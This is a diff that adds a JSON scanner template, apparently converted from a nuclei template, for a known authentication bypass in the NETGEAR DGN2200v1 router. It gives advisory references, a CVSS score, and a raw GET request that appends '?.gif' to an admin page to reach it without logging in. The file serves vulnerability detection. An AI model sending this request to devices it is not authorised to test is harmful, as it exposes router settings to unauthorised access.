@@ -1,0 +1,147 @@
+{
+  "id": "netgear-router-auth-bypass",
+  "name": "NETGEAR DGN2200v1 - Authentication Bypass",
+  "author": "gy741",
+  "severity": "HIGH",
+  "description": "NETGEAR DGN2200v1 router contains an authentication bypass vulnerability. It does not require authentication if a page has \".jpg\", \".gif\", or \"ess_\" substrings but matches the entire URL. Any page on the device can therefore be accessed, including those that require authentication, by appending a GET variable with the relevant substring.",
+  "references": [
+    "https://www.microsoft.com/security/blog/2021/06/30/microsoft-finds-new-netgear-firmware-vulnerabilities-that-could-lead-to-identity-theft-and-full-system-compromise/",
+    "https://kb.netgear.com/000062646/Security-Advisory-for-Multiple-HTTPd-Authentication-Vulnerabilities-on-DGN2200v1"
+  ],
+  "tags": [
+    "netgear",
+    "auth-bypass",
+    "router"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {},
+  "variables": {},
+  "variablesType": "sniper",
+  "cweId": "CWE-287",
+  "cvssScore": "8.1",
+  "cvssMetrics": "CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "GET /WAN_wan.htm?.gif HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\n",
+        "GET /WAN_wan.htm?.gif HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "STATUS",
+          "values": [
+            "200"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        },
+        {
+          "type": "WORD",
+          "part": "all",
+          "values": [
+            "\u003ctitle\u003eWAN Setup\u003c/title\u003e"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "AND",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "netgear-router-auth-bypass",
+    "info": {
+      "name": "NETGEAR DGN2200v1 - Authentication Bypass",
+      "author": "gy741",
+      "severity": "high",
+      "description": "NETGEAR DGN2200v1 router contains an authentication bypass vulnerability. It does not require authentication if a page has \".jpg\", \".gif\", or \"ess_\" substrings but matches the entire URL. Any page on the device can therefore be accessed, including those that require authentication, by appending a GET variable with the relevant substring.",
+      "reference": [
+        "https://www.microsoft.com/security/blog/2021/06/30/microsoft-finds-new-netgear-firmware-vulnerabilities-that-could-lead-to-identity-theft-and-full-system-compromise/",
+        "https://kb.netgear.com/000062646/Security-Advisory-for-Multiple-HTTPd-Authentication-Vulnerabilities-on-DGN2200v1"
+      ],
+      "classification": {
+        "cvss_metrics": "CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
+        "cvss_score": "8.1",
+        "cwe_id": "CWE-287"
+      },
+      "metadata": {
+        "max_request": 2
+      },
+      "tags": "netgear,auth-bypass,router"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "GET /WAN_wan.htm?.gif HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\n",
+          "GET /WAN_wan.htm?.gif HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\n"
+        ],
+        "matchers_condition": "and",
+        "matchers": [
+          {
+            "type": "status",
+            "status": [
+              200
+            ]
+          },
+          {
+            "type": "word",
+            "negative": false,
+            "part": "all",
+            "words": [
+              "\u003ctitle\u003eWAN Setup\u003c/title\u003e"
+            ],
+            "case_insensitive": false
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
